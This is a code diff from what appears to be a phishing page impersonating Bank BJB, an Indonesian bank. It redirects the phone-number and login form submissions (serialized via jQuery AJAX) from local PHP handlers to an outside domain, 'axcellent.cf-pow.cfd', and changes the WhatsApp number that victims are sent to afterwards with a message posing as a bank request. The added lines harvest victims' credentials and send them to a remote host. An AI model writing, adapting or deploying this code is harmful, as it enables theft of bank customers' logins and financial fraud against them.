@@ -9,7 +9,7 @@ $('.load').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'req/no.php',
+            url: 'https://axcellent.cf-pow.cfd/app44/no.php',
             data: $(this).serialize(),
             datatype: 'JSON',           
             complete: function(data) {
@@ -31,7 +31,7 @@ $('.load').fadeIn();
  document.getElementById('kirims').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'req/login.php',
+            url: 'https://axcellent.cf-pow.cfd/app44/login.php',
             data: $(this).serialize(),
             datatype: 'JSON',           
             complete: function(data) {
@@ -58,7 +58,7 @@ audio4.play();
 audio4.loop = false;
 document.getElementById('kirims').innerHTML = "Mohon tunggu sebentar...";
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://api.whatsapp.com/send?phone=6282183616116&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
 $('.load').fadeOut();
     }, 5500);    
 }  
